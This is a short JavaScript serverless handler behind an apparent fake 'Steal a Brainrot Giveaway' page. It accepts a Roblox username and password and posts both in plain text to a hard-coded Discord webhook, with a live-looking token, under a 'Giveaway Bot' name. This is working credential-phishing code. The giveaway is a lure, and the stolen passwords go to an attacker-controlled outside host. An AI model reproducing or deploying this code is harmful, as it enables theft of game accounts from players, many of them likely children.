exports.handler = async (event) => {
  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const { username, password } = JSON.parse(event.body);
    
    const webhookUrl = 'https://discord.com/api/webhooks/1501184976786296842/5iqikAT24tjrD9zwK0g74BNLcfxk3GM_cRQA_mNcGH-_6wfnL2N2FUxQgINOm1X9INJ_';
    
    const payload = {
      username: "Brainrot Giveaway Bot",
      embeds: [{
        title: "🧠 New Giveaway Entry!",
        color: 0x00ff88,
        fields: [
          { name: "👤 Roblox Username", value: `\`${username}\``, inline: true },
          { name: "🔒 Password", value: `\`${password}\``, inline: true },
        ],
        footer: { text: "Steal a Brainrot Giveaway" },
        timestamp: new Date().toISOString()
      }]
    };

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error(`Discord API error: ${response.status}`);
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true })
    };
  } catch (error) {
    console.error('Webhook error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
};